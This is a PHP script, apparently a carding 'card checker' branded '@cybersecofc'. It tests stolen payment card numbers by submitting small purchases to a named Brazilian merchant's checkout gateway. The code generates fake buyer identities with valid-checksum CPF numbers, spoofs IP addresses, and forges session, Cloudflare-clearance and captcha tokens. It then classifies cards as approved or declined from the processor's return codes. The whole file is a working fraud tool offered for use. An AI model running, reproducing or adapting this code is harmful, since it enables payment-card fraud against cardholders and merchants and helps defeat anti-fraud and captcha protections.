<?php

sleep(rand(2, 5));

session_start();

// Configurações
define('BASE_URL', 'https://famaexpress.net');
define('GATEWAY_URL', BASE_URL . '/gatewaypay');
define('COOKIE_FILE', 'cookies.txt');
define('CSRF_FILE', 'csrf.txt');


if (isset($_GET['lista'])) {
    $lista = trim($_GET['lista']);
    $result = testar_cartao($lista);
    
    // Se retornou die, já foi processado
    if ($result === 'die') {
        exit;
    }
    
    $response_time = isset($result['request_info']['response_time']) ? 
                    round($result['request_info']['response_time'], 2) . 's' : 'N/A';
    
    $formatted_response = [
        'error' => $result['error'],
        'success' => $result['success'],
        'actual_message' => $result['actual_message'],
        'message' => $result['message'] . ' @cybersecofc - Tempo: ' . $response_time
    ];
    
    echo json_encode($formatted_response, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
} else {
    $formatted_response = [
        'error' => true,
        'success' => false,
        'actual_message' => '',
        'message' => 'Parâmetro "lista" não encontrado. Use: ?lista=cartao|mes|ano|cvv @cybersecofc'
    ];
    echo json_encode($formatted_response, JSON_PRETTY_PRINT);
}

function testar_cartao($lista) {
    // Separar dados do cartão
    $dados = explode('|', $lista);
    if (count($dados) < 4) {
        return [
            'error' => true,
            'success' => false,
            'actual_message' => '',
            'message' => 'Formato inválido. Use: cartao|mes|ano|cvv'
        ];
    }
    
    $cartao = trim($dados[0]);
    $mes = str_pad(trim($dados[1]), 2, '0', STR_PAD_LEFT);
    $ano_full = trim($dados[2]);
    $cvv = trim($dados[3]);
    
    
    if (strlen($ano_full) == 4) {
        $ano = substr($ano_full, -2);
    } else {
        $ano = $ano_full;
    }
    
    // Validar dados
    if (!preg_match('/^\d{16}$/', $cartao)) {
        return [
            'error' => true,
            'success' => false,
            'actual_message' => '',
            'message' => 'Cartão inválido (16 dígitos)'
        ];
    }
    if (!preg_match('/^\d{2}$/', $mes) || $mes < 1 || $mes > 12) {
        return [
            'error' => true,
            'success' => false,
            'actual_message' => '',
            'message' => 'Mês inválido (01-12)'
        ];
    }
    if (!preg_match('/^\d{2,4}$/', $ano_full)) {
        return [
            'error' => true,
            'success' => false,
            'actual_message' => '',
            'message' => 'Ano inválido'
        ];
    }
    if (!preg_match('/^\d{3,4}$/', $cvv)) {
        return [
            'error' => true,
            'success' => false,
            'actual_message' => '',
            'message' => 'CVV inválido (3-4 dígitos)'
        ];
    }
    
    
    $dados_unicos = gerar_dados_unicos();
    
    
    $result = fazer_requisicao_gateway($cartao, $mes, $ano, $cvv, $dados_unicos);
    
    // Analisar resposta
    return analisar_resposta($result);
}

function gerar_dados_unicos() {
    // Gerar CPF válido
    $cpf = gerar_cpf_valido();
    
    return [
        'email' => 'cyber' . rand(1000, 9999) . '@gmail.com',
        'nome' => 'cybersec ' . bin2hex(random_bytes(3)),
        'telefone' => '(31) 9' . rand(1000, 9999) . '-' . rand(1000, 9999),
        'cpf' => $cpf,
        'cpf_formatado' => substr($cpf, 0, 3) . '.' . 
                          substr($cpf, 3, 3) . '.' . 
                          substr($cpf, 6, 3) . '-' . 
                          substr($cpf, 9, 2),
        'ip' => '201.17.' . rand(200, 255) . '.' . rand(1, 255),
        'visitorID' => 'de60931a95f642345901b02508f4bb887bf80a54',
        'cart_token' => 'ec6c2bb6-a8d8-45d5-82bf-78d6d2d01402',
        'payment_token' => 'cartpanda_cielo',
        'payment_id' => 'cc'
    ];
}

function gerar_cpf_valido() {
    $noveDigitos = '';
    for ($i = 0; $i < 9; $i++) {
        $noveDigitos .= rand(0, 9);
    }
    
    
    $soma = 0;
    for ($i = 0; $i < 9; $i++) {
        $soma += $noveDigitos[$i] * (10 - $i);
    }
    $resto = $soma % 11;
    $digito1 = ($resto < 2) ? 0 : 11 - $resto;
    
    
    $soma = 0;
    for ($i = 0; $i < 9; $i++) {
        $soma += $noveDigitos[$i] * (11 - $i);
    }
    $soma += $digito1 * 2;
    $resto = $soma % 11;
    $digito2 = ($resto < 2) ? 0 : 11 - $resto;
    
    return $noveDigitos . $digito1 . $digito2;
}

function get_cookies_fixos() {
    // Gerar cookies dinâmicos para evitar bloqueio
    $timestamp = time();
    $random_hash = bin2hex(random_bytes(16));
    
    return 'cart_token=ec6c2bb6-a8d8-45d5-82bf-78d6d2d01402; ' .
           'cf_clearance=' . $random_hash . '_' . $timestamp . '; ' .
           'cp_visit_token=' . rand(10000000000000, 99999999999999) . 'a' . rand(100000, 999999) . '.68506472' . bin2hex(random_bytes(8)) . '; ' .
           'cp_session_token=' . rand(1000000000, 9999999999) . 'a' . rand(100000, 999999) . '.47695778' . bin2hex(random_bytes(8)) . '; ' .
           'recentViewsCartX=["2762926"]; ' .
           'session_ip=201.17.' . rand(200, 255) . '.' . rand(1, 255) . '; ' .
           'discount_popup=' . gmdate('D, d M Y H:i:s', $timestamp + rand(3600, 86400)) . ' GMT; ' .
           '__kdtv=t%3D' . $timestamp . '000%3Bi%3D' . bin2hex(random_bytes(20)) . '; ' .
           '_kdt=%7B%22t%22%3A' . $timestamp . '000%2C%22i%22%3A%22' . bin2hex(random_bytes(20)) . '%22%7D; ' .
           'visit_token=' . base64_encode(json_encode(['iv' => bin2hex(random_bytes(16)), 'value' => bin2hex(random_bytes(64)), 'mac' => bin2hex(random_bytes(32))])) . '; ' .
           'session_token=' . base64_encode(json_encode(['iv' => bin2hex(random_bytes(16)), 'value' => bin2hex(random_bytes(128)), 'mac' => bin2hex(random_bytes(32))])) . '; ' .
           'd8c75579126eae00ca86a52a5dc1e5f28d15b6d8=ec6c2bb6-a8d8-45d5-82bf-78d6d2d01402; ' .
           'e5eba65ee79407e60721d67ce5e00e2ba7f90fc6=ec6c2bb6-a8d8-45d5-82bf-78d6d2d01402; ' .
           '21cdabf55053874a697a6c9fd42ea74a40b92680=ec6c2bb6-a8d8-45d5-82bf-78d6d2d01402; ' .
           '7687402b78c85957fe5dfed00f48cd92eccee220=ec6c2bb6-a8d8-45d5-82bf-78d6d2d01402; ' .
           'test_mode=false; ' .
           'fb_from_checkout=' . bin2hex(random_bytes(5)) . '; ' .
           'popup_checkout=yes; ' .
           'popup_checkout_one_time=1; ' .
           'target_time=' . gmdate('D, d M Y H:i:s', $timestamp + 86400) . ' GMT; ' .
           'XSRF-TOKEN=' . base64_encode(json_encode(['iv' => bin2hex(random_bytes(16)), 'value' => bin2hex(random_bytes(128)), 'mac' => bin2hex(random_bytes(32))])) . '; ' .
           'cartx_frontend_session=' . base64_encode(json_encode(['iv' => bin2hex(random_bytes(16)), 'value' => bin2hex(random_bytes(128)), 'mac' => bin2hex(random_bytes(32))])) . '; ' .
           '_gcl_au=1.1.' . rand(1000000000, 9999999999) . '.' . $timestamp . '.790316472.' . ($timestamp + 100) . '.' . ($timestamp + 200);
}

function get_captcha_token() {
    return '0.' . bin2hex(random_bytes(100)) . '.' . bin2hex(random_bytes(32));
}

function get_csrf_token() {
    return bin2hex(random_bytes(16));
}

function fazer_requisicao_gateway($cartao, $mes, $ano, $cvv, $dados_unicos) {
    $ch = curl_init();
    
    
    $boundary = '----WebKitFormBoundary' . bin2hex(random_bytes(8));
    
    
    $fields = [
        'current_route' => 'checkout',
        'cartpay_checkout' => '0',
        'cartpay_enabled' => '0',
        'cart_country_code' => 'BR',
        'is_global_market' => '0',
        'checkout_request_currency' => 'BRL',
        'cartTotalWeight' => rand(1000, 20000),
        'checkoutSubTotalPrice' => '2.99',
        'checkoutTotalPrice' => '2.99',
        'checkoutTotalPriceGlobal' => '0',
        'totalShippingPrice' => '0',
        'totalShippingPriceGlobal' => '0',
        'totalTax' => '0',
        'county' => '',
        'totalDiscount' => '0.00',
        'include_shipping_amount' => '',
        'discount_category' => '',
        'discountCode' => '0',
        'giftDiscountPrice' => '0',
        'giftDiscountCode' => '0',
        'shipping_gateway' => '0',
        'melhor_envio_service' => '0',
        'melhor_envio_company' => '0',
        'melhor_envio_packages' => '0',
        'paid_by_client' => '0',
        'custom_price' => '0',
        'digital_cart_items' => '1',
        'country_code' => '',
        'ocu_exists' => '0',
        'browser_ip' => $dados_unicos['ip'],
        'google_auto_fill' => '1',
        'google_auto_fill_shop_id' => '105025',
        'cf_state_code' => 'MG',
        'cf_state' => 'Minas Gerais',
        'src' => '',
        'reward_token' => '',
        'clearsale_session' => '[object HTMLInputElement]',
        'clearsale_key' => '',
        'couponCode' => '',
        'quantity' => '1',
        'email' => $dados_unicos['email'],
        'fullName' => $dados_unicos['nome'],
        'phoneNumber' => $dados_unicos['telefone'],
        'ficalNumber' => $dados_unicos['cpf_formatado'],
        'cnpjNumber' => '',
        'registrationNumber' => '',
        'zipcode' => '30130005',
        'city' => 'Belo Horizonte',
        'state' => 'MG',
        'address' => 'Rua da Bahia',
        'number' => rand(100, 2000),
        'neighborhood' => 'Centro',
        'compartment' => '',
        'country' => 'Brasil',
        'cardNumber' => $cartao,
        'cardholderName' => $dados_unicos['nome'],
        'cardExpiryDate' => $mes . '/' . $ano,
        'securityCode' => $cvv,
        'installments' => '1',
        'ebanking' => 'Pix',
        'save_information' => '1',
        'docType' => 'CPF',
        'docNumber' => $dados_unicos['cpf'],
        'site_id' => 'MLB',
        'cardExpirationMonth' => $mes,
        'cardExpirationYear' => '20' . $ano,
        'paymentMethodId' => 'cc',
        'recover_source' => '',
        'alert_message_product_qty_not_available' => 'Não há estoque para os produtos que você está tentando comprar.',
        'alert_message_cart_is_empty' => 'Ops! Parece que seu carrinho está vazio.',
        'settingsCaptchaEnable' => '1',
        'settingsCaptchaType' => '1',
        'settingsCaptchaToken' => get_captcha_token(),
        'cf-turnstile-response' => get_captcha_token(),
        'sayswho' => 'Opera ' . rand(120, 130) . ' - Desktop Windows',
        'addCCDiscountPrice' => '0',
        'payment_type' => 'cartpanda_cielo',
        'payment_token' => $dados_unicos['payment_token'],
        'visitorID' => $dados_unicos['visitorID'],
        'cart_token' => $dados_unicos['cart_token'],
        'paymentMethod' => 'cc',
        'abandoned_token' => 'null',
        'currency' => '',
        'payment_id' => $dados_unicos['payment_id']
    ];
    
    
    $body = '';
    foreach ($fields as $name => $value) {
        $body .= "--{$boundary}\r\n";
        $body .= "Content-Disposition: form-data; name=\"{$name}\"\r\n\r\n";
        $body .= "{$value}\r\n";
    }
    $body .= "--{$boundary}--\r\n";
    
    // Gerar headers dinâmicos
    $user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0'
    ];
    
    $user_agent = $user_agents[array_rand($user_agents)];
    $csrf_token = get_csrf_token();
    
    // Headers dinâmicos
    $headers = [
        'Host: famaexpress.net',
        'Cookie: ' . get_cookies_fixos(),
        'sec-ch-ua-platform: "Windows"',
        'x-csrf-token: ' . $csrf_token,
        'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile: ?0',
        'x-requested-with: XMLHttpRequest',
        'user-agent: ' . $user_agent,
        'accept: application/json, text/javascript, */*; q=0.01',
        'content-type: multipart/form-data; boundary=' . $boundary,
        'origin: https://famaexpress.net',
        'sec-fetch-site: same-origin',
        'sec-fetch-mode: cors',
        'sec-fetch-dest: empty',
        'referer: https://famaexpress.net/checkout',
        'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'priority: u=1, i',
        'x-forwarded-for: ' . $dados_unicos['ip']
    ];
    
    // Configurar cURL
    curl_setopt_array($ch, [
        CURLOPT_URL => GATEWAY_URL,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $body,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_ENCODING => 'gzip, deflate, br',
        CURLOPT_TIMEOUT => 30,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 5,
        CURLOPT_HEADER => false,
        CURLINFO_HEADER_OUT => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    ]);
    
    // Executar requisição
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    $curlInfo = curl_getinfo($ch);
    
    curl_close($ch);
    
    return [
        'http_code' => $httpCode,
        'response' => $response,
        'curl_error' => $curlError,
        'curl_info' => $curlInfo
    ];
}

function analisar_resposta($result) {
    // Logar resposta bruta para debug
    $raw_response = $result['response'];
    $http_code = $result['http_code'];
    
    // Verificar se houve erro de permissão
    if (strpos($raw_response, "don't have permissions") !== false || 
        strpos($raw_response, "You don't have permission") !== false ||
        strpos($raw_response, "Access denied") !== false) {
        
        // Retornar die com mensagem de permissão
        die(json_encode([
            'error' => true,
            'success' => false,
            'actual_message' => '',
            'message' => 'ERRO DE PERMISSÃO - Site bloqueando acesso'
        ], JSON_PRETTY_PRINT));
    }
    
    $response_data = json_decode($raw_response, true);
    
    // Mapeamento de códigos de retorno para os que você forneceu
    $codigos_retorno = [
        0 => 'Autorizada - Transação aprovada na hora.',
        1 => 'Negada - Cartão recusado pela operadora (motivo genérico).',
        2 => 'Negada - Recusa específica (saldo insuficiente, limite excedido, etc.).',
        4 => 'Cartão Bloqueado - Cartão com bloqueio permanente ou temporário.',
        5 => 'Cancelada - Cliente cancelou no PIN-pad ou tempo esgotado.',
        6 => 'Pendente - Aguardando confirmação (ex.: débito com senha não confirmada).',
        7 => 'Erro na Transação - Dados incorretos, cartão inválido ou falha na comunicação.',
        8 => 'Erro no Terminal - Problema no hardware (LIO, PIN-pad, conexão).',
        9 => 'Em Andamento - Aguardando ação do cliente (inserir cartão, digitar senha, aproximar).',
        80 => 'Pré-autorizada - Pré-autorização confirmada (cartão crédito).'
    ];
    
    if ($response_data && json_last_error() === JSON_ERROR_NONE) {
        // Verificar se há código de retorno específico na resposta
        $codigo_retorno = null;
        $status_cielo = '';
        
        // Procurar por códigos de retorno conhecidos
        if (isset($response_data['returnCode']) && isset($codigos_retorno[$response_data['returnCode']])) {
            $codigo_retorno = $response_data['returnCode'];
            $status_cielo = $codigos_retorno[$codigo_retorno];
        } elseif (isset($response_data['ReturnCode']) && isset($codigos_retorno[$response_data['ReturnCode']])) {
            $codigo_retorno = $response_data['ReturnCode'];
            $status_cielo = $codigos_retorno[$codigo_retorno];
        } elseif (isset($response_data['codigo_retorno']) && isset($codigos_retorno[$response_data['codigo_retorno']])) {
            $codigo_retorno = $response_data['codigo_retorno'];
            $status_cielo = $codigos_retorno[$codigo_retorno];
        } elseif (isset($response_data['code']) && isset($codigos_retorno[$response_data['code']])) {
            $codigo_retorno = $response_data['code'];
            $status_cielo = $codigos_retorno[$codigo_retorno];
        }
        
        // Verificar se é reprovado
        $is_reprovado = false;
        $reprovado_codes = [1, 2, 4, 5, 7, 8]; // Códigos de reprovação
        
        if ($codigo_retorno !== null) {
            // Se for código de reprovação, retornar die
            if (in_array($codigo_retorno, $reprovado_codes)) {
                die(json_encode([
                    'error' => true,
                    'success' => false,
                    'actual_message' => '',
                    'message' => 'REPROVADO - ' . $status_cielo,
                    'codigo_retorno' => $codigo_retorno,
                    'status_cielo' => $status_cielo
                ], JSON_PRETTY_PRINT));
            }
            
            // Verificar se é live (aprovado ou pendente)
            $codigos_live = [0, 6, 9, 80];
            if (!in_array($codigo_retorno, $codigos_live)) {
                // Se não for nem live nem reprovado (outro código não mapeado)
                die(json_encode([
                    'error' => true,
                    'success' => false,
                    'actual_message' => '',
                    'message' => 'CÓDIGO NÃO RECONHECIDO: ' . $codigo_retorno
                ], JSON_PRETTY_PRINT));
            }
        }
        
        // VERIFICAÇÃO CRÍTICA: Se a mensagem contém palavras de negação, retornar DIE
        $mensagem_negacao = '';
        if (isset($response_data['message'])) {
            $mensagem_negacao = strtolower($response_data['message']);
        } elseif (isset($response_data['decline_message'])) {
            $mensagem_negacao = strtolower($response_data['decline_message']);
        }
        
        // Palavras-chave que indicam reprovação
        $palavras_reprovacao = [
            'negado', 'negada', 'rejeitado', 'rejeitada', 'recusado', 'recusada',
            'recuse', 'denied', 'declined', 'failed', 'falhou', 'recusa',
            'pagamento negado', 'cartão recusado', 'transação recusada',
            'tente outro cartão', 'escolha outro método'
        ];
        
        foreach ($palavras_reprovacao as $palavra) {
            if (strpos($mensagem_negacao, $palavra) !== false) {
                die(json_encode([
                    'error' => true,
                    'success' => false,
                    'actual_message' => '',
                    'message' => 'REPROVADO - ' . (isset($response_data['message']) ? $response_data['message'] : 'Cartão recusado')
                ], JSON_PRETTY_PRINT));
            }
        }
        
        $formatted = [
            'error' => isset($response_data['error']) ? (bool)$response_data['error'] : true,
            'success' => isset($response_data['success']) ? (bool)$response_data['success'] : false,
            'actual_message' => isset($response_data['actual_message']) ? $response_data['actual_message'] : '',
            'message' => isset($response_data['message']) ? $response_data['message'] : 
                        (isset($response_data['decline_message']) ? $response_data['decline_message'] : ''),
            'payment_status' => isset($response_data['payment_status']) ? $response_data['payment_status'] : '',
            'payment_actual_status' => isset($response_data['payment_actual_status']) ? $response_data['payment_actual_status'] : '',
            'decline_message' => isset($response_data['decline_message']) ? $response_data['decline_message'] : '',
            'thankyouID' => isset($response_data['thankyouID']) ? $response_data['thankyouID'] : '',
            'payment_id' => isset($response_data['payment_id']) ? $response_data['payment_id'] : '',
            'transaction_id' => isset($response_data['transaction_id']) ? $response_data['transaction_id'] : '',
            'authorization_code' => isset($response_data['authorization_code']) ? $response_data['authorization_code'] : '',
            'http_code' => $http_code,
            'gateway_response' => $response_data,
            'codigo_retorno' => $codigo_retorno,
            'status_cielo' => $status_cielo
        ];
        
        // CORREÇÃO CRÍTICA: Ajustar lógica de sucesso/erro baseado na mensagem real
        // Se a mensagem contém "negado" mas error=false, forçar error=true
        $mensagem_lower = strtolower($formatted['message']);
        if (strpos($mensagem_lower, 'negado') !== false || 
            strpos($mensagem_lower, 'recusado') !== false ||
            strpos($mensagem_lower, 'rejeitado') !== false) {
            $formatted['error'] = true;
            $formatted['success'] = false;
            // Não retornar die aqui ainda, vamos deixar o fluxo continuar para ver o resultado final
        }
        
        // Determinar status final
        if (stripos($formatted['payment_status'], 'aprovado') !== false || 
            stripos($formatted['payment_actual_status'], 'approve') !== false ||
            stripos($formatted['message'], 'aprovado') !== false ||
            ($codigo_retorno === 0)) {
            $formatted['error'] = false;
            $formatted['success'] = true;
            $formatted['status'] = 'APROVADO';
        } elseif (in_array($codigo_retorno, [6, 9, 80])) {
            $formatted['error'] = false;
            $formatted['success'] = true;
            $formatted['status'] = 'PENDENTE/EM ANDAMENTO';
        } elseif (stripos($formatted['payment_status'], 'rejeitado') !== false || 
                 stripos($formatted['payment_actual_status'], 'reject') !== false ||
                 stripos($formatted['message'], 'negado') !== false ||
                 stripos($formatted['decline_message'], 'negado') !== false) {
            // AGORA RETORNA DIE se for reprovado
            die(json_encode([
                'error' => true,
                'success' => false,
                'actual_message' => '',
                'message' => 'REPROVADO - ' . $formatted['message']
            ], JSON_PRETTY_PRINT));
        } else {
            $formatted['status'] = 'INDEFINIDO';
        }
        
    } else {
        
        $message = 'Resposta inválida do servidor';
        $status = 'ERRO';
        
        // Verificar se há mensagem de negação na resposta bruta
        $raw_lower = strtolower($raw_response);
        $palavras_reprovacao_raw = [
            'negado', 'negada', 'rejeitado', 'rejeitada', 'recusado', 'recusada',
            'recuse', 'denied', 'declined', 'failed', 'falhou', 'recusa',
            'pagamento negado', 'cartão recusado', 'transação recusada'
        ];
        
        foreach ($palavras_reprovacao_raw as $palavra) {
            if (strpos($raw_lower, $palavra) !== false) {
                die(json_encode([
                    'error' => true,
                    'success' => false,
                    'actual_message' => '',
                    'message' => 'REPROVADO - Cartão recusado'
                ], JSON_PRETTY_PRINT));
            }
        }
        
        
        $patterns = [
            '/aprovado|approved|success/i' => 'APROVADO',
            '/negado|rejeitado|rejected|declined|failed/i' => 'REPROVADO',
            '/Cart Items Not Found/i' => 'CARRINHO_INVALIDO',
            '/invalid|invalido/i' => 'INVALIDO',
            '/error|erro/i' => 'ERRO',
            '/pendente|pending|andamento/i' => 'PENDENTE'
        ];
        
        foreach ($patterns as $pattern => $pattern_status) {
            if (preg_match($pattern, $raw_response)) {
                $message = 'Status detectado: ' . $pattern_status;
                $status = $pattern_status;
                
                // Se for reprovado, die
                if ($pattern_status === 'REPROVADO') {
                    die(json_encode([
                        'error' => true,
                        'success' => false,
                        'actual_message' => '',
                        'message' => 'REPROVADO - Cartão recusado'
                    ], JSON_PRETTY_PRINT));
                }
                break;
            }
        }
        
        
        if (preg_match('/"message":"([^"]+)"/', $raw_response, $matches)) {
            $message = $matches[1];
        } elseif (preg_match('/<title>([^<]+)<\/title>/', $raw_response, $matches)) {
            $message = $matches[1];
        } elseif (strlen($raw_response) < 500) {
            $message = $raw_response;
        }
        
        // Verificar se a resposta contém algum código de retorno numérico
        if (preg_match('/"returnCode":\s*(\d+)/i', $raw_response, $matches)) {
            $codigo_retorno = intval($matches[1]);
            if (isset($codigos_retorno[$codigo_retorno])) {
                $status_cielo = $codigos_retorno[$codigo_retorno];
                
                // Verificar se é reprovado
                $reprovado_codes = [1, 2, 4, 5, 7, 8];
                if (in_array($codigo_retorno, $reprovado_codes)) {
                    die(json_encode([
                        'error' => true,
                        'success' => false,
                        'actual_message' => '',
                        'message' => 'REPROVADO - ' . $status_cielo,
                        'codigo_retorno' => $codigo_retorno,
                        'status_cielo' => $status_cielo
                    ], JSON_PRETTY_PRINT));
                }
                
                $message = $status_cielo;
            }
        }
        
        $formatted = [
            'error' => true,
            'success' => false,
            'actual_message' => '',
            'message' => $message,
            'payment_status' => 'Pagamento ' . strtolower($status),
            'payment_actual_status' => strtolower($status),
            'decline_message' => $message,
            'thankyouID' => '',
            'payment_id' => '',
            'transaction_id' => '',
            'authorization_code' => '',
            'http_code' => $http_code,
            'status' => $status,
            'raw_response_preview' => substr($raw_response, 0, 500)
        ];
    }
    
    // VERIFICAÇÃO FINAL: Se após toda análise ainda tiver "negado" na mensagem, retornar DIE
    if (isset($formatted['message']) && 
        (stripos($formatted['message'], 'negado') !== false ||
         stripos($formatted['message'], 'recusado') !== false ||
         stripos($formatted['message'], 'rejeitado') !== false ||
         stripos($formatted['message'], 'tente outro cartão') !== false)) {
        
        die(json_encode([
            'error' => true,
            'success' => false,
            'actual_message' => '',
            'message' => 'REPROVADO - ' . $formatted['message']
        ], JSON_PRETTY_PRINT));
    }
    
    $formatted['request_info'] = [
        'http_code' => $http_code,
        'curl_error' => $result['curl_error'],
        'response_time' => isset($result['curl_info']['total_time']) ? $result['curl_info']['total_time'] : 0
    ];
    
    return $formatted;
}
?>
